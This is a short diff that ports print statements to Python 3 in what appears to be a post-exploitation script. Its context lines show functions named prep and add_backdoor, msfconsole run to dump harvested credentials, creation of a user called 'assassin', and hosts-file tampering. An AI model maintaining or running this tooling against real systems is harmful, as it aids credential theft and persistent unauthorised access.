@@ -25,10 +25,10 @@ def keygen():
 
 def prep():
     # save creds output to a file for grep & shit
-    print "hmmm... let see how many passwords we have got ......\n"
+    print("hmmm... let see how many passwords we have got ......\n")
     os.system("msfconsole -q -r db")  # just create the creds output
     # create new user (e.g., assassin)
-    print "create new user (assassin) \n"
+    print("create new user (assassin) \n")
     os.system("bash -c 'source shell; test'")
     sys.exit()
 
@@ -72,8 +72,8 @@ def add_backdoor():
             stderr = subprocess.PIPE
             )
             out, error = power.communicate()
-            print out
-            print error
+            print(out)
+            print(error)
             hostsFile.close()
             sys.exit()
 
